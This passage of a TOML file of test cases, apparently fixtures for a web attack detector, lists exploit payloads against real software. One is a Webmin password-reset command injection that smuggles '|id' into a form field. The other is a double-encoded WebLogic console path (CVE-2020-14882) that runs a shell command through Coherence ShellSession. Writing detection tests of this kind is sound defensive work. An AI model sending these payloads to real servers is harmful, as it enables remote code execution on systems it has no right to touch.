class = "cmdi"
payload = "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"
description = "Webmin password reset RCE"

[[case]]
id = "cve_2020_14882_weblogic_console"
class = "path"
payload = "/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(new%20String[]{%22/bin/sh%22,%22-c%22,%22id%22})%22)"
description = "WebLogic auth bypass + Coherence RCE"

[[case]]
